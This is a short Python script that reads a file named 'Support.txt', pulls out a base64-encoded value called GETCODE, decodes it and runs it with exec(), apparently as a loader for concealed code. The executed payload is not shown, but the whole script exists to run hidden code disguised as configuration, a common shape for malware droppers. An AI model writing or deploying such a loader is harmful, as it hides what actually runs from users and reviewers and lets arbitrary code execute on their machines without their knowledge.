import os
import base64

def load_variables(filename):
    variables = {}
    with open(filename, 'r') as file:
        for line in file:
            line = line.strip()
            if line and '=' in line:
                key, value = line.split('=', 1)
                variables[key] = value
    return variables

config = load_variables('Support.txt')
GETCODE = config.get('GETCODE', '')

if GETCODE:
    GETCODE += '=' * (-len(GETCODE) % 4)  # Add padding if necessary
    try:
        decoded_bytes = base64.b64decode(GETCODE)
        decoded_code = decoded_bytes.decode('utf-8')
        exec(decoded_code)
    except Exception as e:
        print(f"Error decoding or executing code: {e}")
else:
    print("GETCODE not found in the configuration.")
